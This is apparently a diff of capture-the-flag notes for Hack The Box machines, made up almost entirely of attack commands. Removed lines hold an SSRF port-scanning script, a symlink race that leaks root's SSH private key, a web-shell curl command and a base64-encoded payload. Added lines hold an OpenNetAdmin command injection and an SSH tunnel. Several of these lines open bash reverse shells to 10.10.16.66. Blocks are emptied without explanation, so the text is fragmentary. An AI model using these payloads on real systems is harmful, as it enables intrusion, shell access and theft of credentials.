@@ -1,47 +1,33 @@
 ```
-#!/usr/bin/python3
-import requests
-with open("a", 'wb') as f:
-f.write(b'')
-for port in range(1, 65535):
-with open("a", 'rb') as file:
-data_post = {"bookurl": f"http://127.0.0.1:{port}"}
-data_file = {"bookfile": file}
-try:
-r = requests.post("http://editorial.htb/upload-cover",
-files=data_file, data=data_post)
-if not r.text.strip().endswith('.jpeg'):
-print(f"{port} --- {r.text}")
-except requests.RequestException as e:
-print(f"Error on port {port}: {e}")
+curl -s -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;bash -c 'bash -i >%26 /dev/tcp/10.10.16.66/443 0>%261'&xajaxargs[]=ping" http://10.129.227.110/ona/
 ```
 
 ```
-echo "bash -i >& /dev/tcp/10.10.16.66/4444 0>&1" > /tmp/shell.sh
+00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1
 ```
 
 ```
-git-dumper http://dev.linkvortex.htb/.git gitdump
+ssh jimmy@10.129.227.110 -L 52846:localhost:52846
 ```
 
 ```
-while true;do ln -sf /root/.ssh/id_rsa /var/quarantined/key.png;done
+
 ```
 
 ```
-curl -G --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.16.66/4444 0>&1"' http://10.129.227.126/uploads/10_10_16_66.php.png
+
 ```
 
 ```
-uploads/10_10_16_66.php.png?cmd=
+
 ```
 
 ```
-echo -n 'bash -c "bash -i >/dev/tcp/10.10.16.66/4444 0>&1"' | base64
+
 ```
 
 ```
-YmFzaCAtYyAiYmFzaCAtaSA+L2Rldi90Y3AvMTAuMTAuMTYuNjYvNDQ0NCAwPiYxIg==
+
 ```
 
 ```
